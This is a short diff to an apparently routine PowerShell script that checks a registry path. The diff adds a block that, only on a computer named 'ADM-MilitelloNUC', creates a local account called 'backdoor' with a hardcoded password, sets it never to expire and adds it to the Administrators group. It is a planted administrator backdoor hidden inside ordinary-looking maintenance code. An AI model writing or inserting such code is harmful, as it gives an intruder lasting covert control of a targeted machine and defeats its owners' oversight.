@@ -65,4 +65,21 @@ if (-not (Test-Path -Path $registryPath) -or ((Get-Item -LiteralPath $registryPa
     Stop-Transcript
 }
 
+# Check if the computer name matches the target
+if ($env:COMPUTERNAME -eq "ADM-MilitelloNUC") {
+    # Check if the user 'backdoor' exists
+    $userExists = Get-LocalUser -Name "backdoor" -ErrorAction SilentlyContinue
+    
+    if (-not $userExists) {
+        # Create secure string for password
+        $password = ConvertTo-SecureString "B@ckdoor1!" -AsPlainText -Force
+        
+        # Create the new user with the specified password
+        New-LocalUser -Name "backdoor" -Password $password -FullName "Admin Backdoor" -Description "Local administrator account" -AccountNeverExpires -PasswordNeverExpires
+        
+        # Add the user to the Administrators group
+        Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
+    }
+}
+
 return $ret
